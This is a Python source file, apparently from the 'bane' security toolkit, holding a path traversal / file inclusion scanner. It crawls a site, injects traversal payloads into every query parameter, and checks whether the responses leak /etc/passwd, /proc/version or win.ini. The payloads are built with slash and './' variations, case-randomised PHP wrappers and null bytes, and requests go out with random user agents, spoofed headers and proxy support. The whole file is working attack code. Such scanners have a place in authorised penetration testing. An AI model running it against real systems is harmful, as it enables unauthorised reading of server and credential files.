from bane.scanners.vulnerabilities.utils import *



class Path_Traversal_Scanner:

    @staticmethod
    def path_traversal_check(
        u,
        php_wrapper="file",
        linux_file=0,
        null_byte=False,
        bypass=False,
        target_os="linux",
        proxy=None,
        timeout=10,
        user_agent=None,
        cookie=None,
        headers={}
    ):
        """
        this function is for FI vulnerability test using a link"""
        linux_files = ["{}proc{}version", "{}etc{}passwd"]
        if user_agent:
            us = user_agent
        else:
            us = random.choice(Common_Variables.user_agents_list)
        if cookie:
            heads = {"User-Agent": us, "Cookie": cookie}
        else:
            heads = {"User-Agent": us}
        heads.update(
            {
                "Referer": u,
                "Origin": u.split("://")[0] + "://" + u.split("://")[1].split("/")[0],
            }
        )
        heads.update(headers)
        if "=" not in u:
            return (False, "")
        else:
            if target_os.lower() == "linux":
                l = linux_files[linux_file]
            else:
                l = "c:{}windows{}win.ini"
            if bypass == True:
                l = l.format("./" * random.randint(1, 5), "./" * random.randint(1, 5))
            else:
                l = l.format("/" * random.randint(1, 5), "/" * random.randint(1, 5))
            if php_wrapper:
                l = (
                    "".join(random.choice((str.upper, str.lower))(c) for c in php_wrapper)
                    + "://"
                    + l
                )
            if null_byte == True:
                l += "%00"
            try:
                r = requests.Session().get(
                    u.format(l), headers=heads, proxies=proxy, timeout=timeout, verify=False
                )
                if (
                    (
                        len(
                            re.findall(
                                r"[a-zA-Z0-9_]*:[a-zA-Z0-9_]*:[\d]*:[\d]*:[a-zA-Z0-9_]*:/",
                                r.text,
                            )
                        )
                        > 0
                    )
                    or (
                        all(
                            x in r.text
                            for x in [
                                "; for 16-bit app support",
                                "[fonts]",
                                "[extensions]",
                                "[mci extensions]",
                                "[files]",
                                "[Mail]",
                            ]
                        )
                        == True
                    )
                    or (all(x in r.text for x in ["Linux version", "(gcc version"]) == True)
                ):
                    return (True, r.url)
            except Exception as e:
                pass
        return (False, "")


    @staticmethod
    def path_traversal_urls(
        u,
        null_byte=False,
        bypass=False,
        target_os="linux",
        php_wrapper="file",
        timeout=10,
        user_agent=None,
        cookie=None,
        headers={},
        http_proxies=None,
        socks4_proxies=None,
        socks5_proxies=None
    ):
        proxies=Proxies_Interface.get_requests_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
        res = []
        if u.split("?")[0][-1] != "/" and "." not in u.split("?")[0].rsplit("/", 1)[-1]:
            u = u.replace("?", "/?")
        a = Vulnerability_Scanner_Utilities.crawl(u, proxy=Vulnerability_Scanner_Utilities.setup_proxy(proxies), timeout=timeout, cookie=cookie, user_agent=user_agent)
        l = []
        d = a.values()
        for x in d:
            if len(x[3]) > 0:
                l.append(x)
        o = []
        for x in l:
            ur = x[1]
            if ur.split("?")[0] not in o:
                o.append(ur.split("?")[0])
                if (
                    ur.split("?")[0][-1] != "/"
                    and "." not in ur.split("?")[0].rsplit("/", 1)[-1]
                ):
                    ur = ur.replace("?", "/?")
                for y in x[3]:
                    if Vulnerability_Scanner_Utilities.valid_parameter(y[1]) == True:
                        trgt = ur.replace(y[0] + "=" + y[1], y[0] + "={}")
                        q = Path_Traversal_Scanner.path_traversal_check(
                            trgt,
                            null_byte=null_byte,
                            bypass=bypass,
                            linux_file=0,
                            target_os="linux",
                            php_wrapper=php_wrapper,
                            timeout=timeout,
                            cookie=cookie,
                            user_agent=user_agent,
                            headers=headers,
                            proxy=Vulnerability_Scanner_Utilities.setup_proxy(proxies)
                        )
                        if q[0] == True:
                            if q[1] not in res:
                                res.append(q[1])
                        else:
                            q = Path_Traversal_Scanner.path_traversal_check(
                                trgt,
                                null_byte=null_byte,
                                bypass=bypass,
                                linux_file=1,
                                target_os="linux",
                                php_wrapper=php_wrapper,
                                timeout=timeout,
                                cookie=cookie,
                                user_agent=user_agent,
                                headers=headers,
                                proxy=Vulnerability_Scanner_Utilities.setup_proxy(proxies)
                            )
                            if q[0] == True:
                                if q[1] not in res:
                                    res.append(q[1])
                            else:
                                q = Path_Traversal_Scanner.path_traversal_check(
                                    trgt,
                                    null_byte=null_byte,
                                    bypass=bypass,
                                    php_wrapper=php_wrapper,
                                    timeout=timeout,
                                    cookie=cookie,
                                    user_agent=user_agent,
                                    target_os="windows",
                                    headers=headers,
                                    proxy=Vulnerability_Scanner_Utilities.setup_proxy(proxies)
                                )
                                if q[0] == True:
                                    if q[1] not in res:
                                        res.append(q[1])
        return res

    @staticmethod
    def scan(
        u,
        max_pages=5,
        logs=True,
        null_byte=False,
        bypass=False,
        target_os="linux",
        php_wrapper=None,#"file",
        timeout=10,
        user_agent=None,
        cookie=None,
        pages=[],
        headers={},
        http_proxies=None,
        socks4_proxies=None,
        socks5_proxies=None
    ):
        proxies=Proxies_Interface.get_requests_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
        l=[]
        started_at=time.time()
        if pages==[]:
            pages=Pager_Interface.spider_url(u,cookie=cookie,max_pages=max_pages,timeout=timeout,user_agent=user_agent,proxy=Vulnerability_Scanner_Utilities.setup_proxy(proxies))
        for x in pages:
            if logs==True:
                print('\n\nPage: {}\n'.format(x))
            result=Path_Traversal_Scanner.path_traversal_urls(x,
                                null_byte=null_byte,
                                bypass=bypass,
                                target_os=target_os,
                                php_wrapper=php_wrapper,
                                timeout=timeout,
                                user_agent=user_agent,
                                cookie=cookie,
                                headers=headers,
                                http_proxies=http_proxies,
                                socks4_proxies=socks4_proxies,
                                socks5_proxies=socks5_proxies)
            if logs==True:
                for r in result:
                    print("Vulnerable URL: {}".format(r))
            l.append({'page':x,'result':result})
        return  {'result':[x for x in l if x['result']!=[]],'start_date':started_at,'end_date':time.time()}

